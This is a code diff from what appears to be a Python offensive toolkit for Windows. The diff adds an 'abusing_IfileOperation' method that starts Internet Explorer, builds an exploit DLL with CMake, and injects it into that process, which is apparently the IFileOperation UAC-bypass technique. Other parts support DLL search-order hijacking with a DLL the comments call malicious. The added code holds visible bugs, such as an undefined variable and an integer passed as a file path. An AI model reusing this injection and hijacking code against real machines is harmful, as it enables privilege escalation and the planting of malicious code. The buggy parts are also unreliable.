@@ -88,7 +88,13 @@ class hiJacking():
                 return False
     #exe파일을 직접 실행하여 pid를 가져옴
     def create_process(self,path):
-            return subprocess.Popen([path]).pid
+    
+        try:
+          pid = subprocess.Popen([path]).pid
+        except:
+            print("Wrong EXE Path!")
+            exit(0)
+        return pid
         
     #악성 dll을 입력받은 경로로 바꿔줌
     def change_dll(self,dll_path,hijactable_dll_path,pid):
@@ -169,6 +175,35 @@ class hiJacking():
                 print("Nah....")
         else:
             print("Not Found writable dir")
+            
+    def abusing_IfileOperation(self,exe_path,dll_path="CreateDLL.dll"):
+        dll_abspath = ""
+        if(dll_path == "CreateDLL.dll"):
+            dll_abspath = os.path.dirname(__file__) + "\\" + dll_path
+        else:
+            dll_abspath = dll_path        
+        #1. 익스플로러 실행하기
+        
+        explore_pid = self.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
+        exe_pid = self.create_process(exe_path)
+        program_name, list_dlls = self.list_dll(exe_pid)
+        # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
+        
+        # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
+        if(os.system("cmake")):
+            os.system("CreateIFileOperationDLL/Build.bat")     
+        else:
+            os.system("cmake.msi")
+            print("Cmake 설치 후 다시 기능을 실행해 주세요")
+            return
+        exploit_dll_path = "CreateIFileOperationDLL/Debug/exploitDll.dll"
+        # #4. explore에 빌드한 dll 인젝션
+        
+        inject(explore_pid,exploit_dll_path)
+        
+        psutil.Process(explore_pid).kill()
+        
+        psutil.Process(pid).kill()
 class injection():
     def injection(self):
         pass
@@ -201,11 +236,12 @@ class injection():
 if __name__=='__main__': 
     dll_inject = injection()
     dll_hijact = hiJacking()
-    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
-    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-    #pid = dll_hijact.create_process(path_exe)
-    #inject(pid,path_dll)
+    # path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
+    # path_dll = "CreateIFileOperationDLL\Debug\PROJECT_NAME.dll"
+    # pid = dll_hijact.create_process(path_exe)
+    # inject(pid,path_dll)
+    dll_hijact.abusing_IfileOperation(1234)
     #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
-    success = dll_hijact.search_order_hijack(20588)    
-    for i,j in success.items():
-        print(i,j)
+    # success = dll_hijact.search_order_hijack(20588)    
+    # for i,j in success.items():
+    #     print(i,j)
